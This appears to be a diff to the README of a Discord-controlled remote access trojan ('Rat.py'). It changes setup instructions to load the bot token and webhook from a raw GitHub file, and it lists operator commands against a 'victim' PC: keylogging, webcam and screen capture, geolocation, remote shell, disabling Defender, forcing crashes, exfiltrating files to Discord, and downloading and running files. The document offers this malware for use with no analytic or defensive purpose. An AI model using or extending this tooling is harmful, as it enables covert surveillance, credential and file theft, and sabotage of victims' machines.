@@ -36,38 +36,63 @@
 - ✅ Defender Disabler & System Control  
 - ✅ Crash PC / Self Destruct / Memory Flush
 ---
-## 📦 Setup Instructions
 
-```bash
-1. Create a private Pastebin:
-   LINE 1 = Your Discord Bot Token
-   LINE 2 = Your Webhook URL
+🗂️ Step 1 — Create a Private GitHub Gist or Repo File
+Make a Gist or file in a private repo (e.g., config.txt)
 
-2. Replace this line in the code:
-   config_url = "https://pastebin.com/raw/your_id_here"
+Add:
 
-3. Run the bot:
-   > python Rat.py
+pgsql
+Copy
+Edit
+LINE 1 = Your Discord Bot Token  
+LINE 2 = Your Webhook URL
+Click "Raw" on the file and copy the direct URL (e.g. https://raw.githubusercontent.com/youruser/yourrepo/main/config.txt)
 
+🔧 Step 2 — Update Bot Config
+In Rat.py, replace this line:
+
+python
+Copy
+Edit
+config_url = "https://pastebin.com/raw/your_id_here"
+with:
+
+python
+Copy
+Edit
+config_url = "https://raw.githubusercontent.com/youruser/yourrepo/main/config.txt"
+✅ Tip: Use GitHub raw links—they’re fast, direct, and more reliable than Pastebin.
+
+▶️ Step 3 — Run the Bot
+Launch from terminal:
+
+bash
+Copy
+Edit
+python Rat.py
+📜 COMMAND PANEL
 🖥 SYSTEM
 Command	Description
 .help	Show help menu
-.info	PC info (username, OS, IP)
-.geo	Grab geolocation
-.ss	Screenshot victim screen
-.record	Record screen (10s)
-.webcam	Capture webcam snapshot
-.restart	Restart PC
-.shutdown	Shutdown PC
-.crash	Kill svchost (may BSOD)
+.info	Get PC info (username, OS, public IP)
+.geo	Grab geolocation data
+.ss	Screenshot victim's screen
+.record	Record screen for 10 seconds
+.webcam	Take webcam snapshot
+.restart	Restart victim’s PC
+.shutdown	Shutdown victim’s PC
+.crash	Kill svchost.exe (force crash or BSOD)
 
 🔧 CONTROL
 Command	Description
-.key start/stop	Start/Stop keylogger
-.shell <cmd>	Run CMD/PowerShell
-.moff / .mon	Turn off/on monitor
-.msg <text>	Show error popup
-`.speak <txt	rate
+.key start/stop	Start or stop keylogger
+.shell <cmd>	Execute CMD or PowerShell commands
+.moff / .mon	Turn off / turn on monitor
+.msg <text>	Show error-style popup message
+.speak <text>	Speak text out loud (system voice)
 
 📁 FILE SYSTEM
-.up
+Command	Description
+.up	Upload file from victim to Discord channel
+.dl <url>	Download and run a file on victim's machine
